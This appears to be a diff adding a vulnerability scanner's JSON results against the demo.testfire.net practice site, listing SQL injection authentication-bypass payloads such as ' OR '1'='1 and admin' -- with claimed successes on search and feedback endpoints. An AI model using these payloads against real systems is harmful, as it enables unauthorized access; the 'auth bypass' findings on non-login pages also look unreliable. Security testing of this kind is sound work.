@@ -1,0 +1,72 @@
+[
+    {
+        "url": "https://demo.testfire.net/",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "' OR '1'='1",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on https://demo.testfire.net/search.jsp using payload: ' OR '1'='1"
+    },
+    {
+        "url": "https://demo.testfire.net/",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "' OR 1=1 --",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on https://demo.testfire.net/search.jsp using payload: ' OR 1=1 --"
+    },
+    {
+        "url": "https://demo.testfire.net/",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "admin' --",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on https://demo.testfire.net/search.jsp using payload: admin' --"
+    },
+    {
+        "url": "https://demo.testfire.net/",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "admin' #",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on https://demo.testfire.net/search.jsp using payload: admin' #"
+    },
+    {
+        "url": "https://demo.testfire.net/",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "' OR 'a'='a",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on https://demo.testfire.net/search.jsp using payload: ' OR 'a'='a"
+    },
+    {
+        "url": "https://demo.testfire.net/feedback.jsp",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "' OR '1'='1",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on https://demo.testfire.net/sendFeedback using payload: ' OR '1'='1"
+    },
+    {
+        "url": "https://demo.testfire.net/feedback.jsp",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "' OR 1=1 --",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on https://demo.testfire.net/sendFeedback using payload: ' OR 1=1 --"
+    },
+    {
+        "url": "https://demo.testfire.net/feedback.jsp",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "admin' --",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on https://demo.testfire.net/sendFeedback using payload: admin' --"
+    },
+    {
+        "url": "https://demo.testfire.net/feedback.jsp",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "admin' #",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on https://demo.testfire.net/sendFeedback using payload: admin' #"
+    },
+    {
+        "url": "https://demo.testfire.net/feedback.jsp",
+        "vulnerability type": "Auth Bypass SQLI",
+        "payload": "' OR 'a'='a",
+        "severity": "Critical",
+        "evidence": "Auth bypass successful on https://demo.testfire.net/sendFeedback using payload: ' OR 'a'='a"
+    }
+]
